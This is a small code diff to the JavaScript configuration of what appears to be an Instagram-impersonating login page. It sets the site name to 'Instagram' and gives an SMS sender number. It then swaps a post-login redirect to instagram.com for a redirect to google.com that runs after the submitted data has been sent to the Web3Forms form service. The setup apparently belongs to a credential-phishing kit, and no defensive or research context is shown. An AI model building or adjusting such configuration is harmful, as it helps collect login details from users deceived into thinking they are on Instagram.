@@ -8,9 +8,6 @@ const APP_CONFIG = {
   SITE_NAME: 'Instagram',
   SMS_SENDER: '+34642549035',
 
-  /** Tras iniciar sesión, redirige a esta URL (p. ej. 'https://instagram.com') */
-  LOGIN_REDIRECT_URL: 'https://www.instagram.com',
-
-  /** Cambia a true cuando quieras activar la redirección tras el login */
-  LOGIN_REDIRECT_ENABLED: false,
+  /** URL de destino tras enviar datos correctamente a Web3Forms */
+  WEB3FORMS_REDIRECT_URL: 'https://google.com',
 };
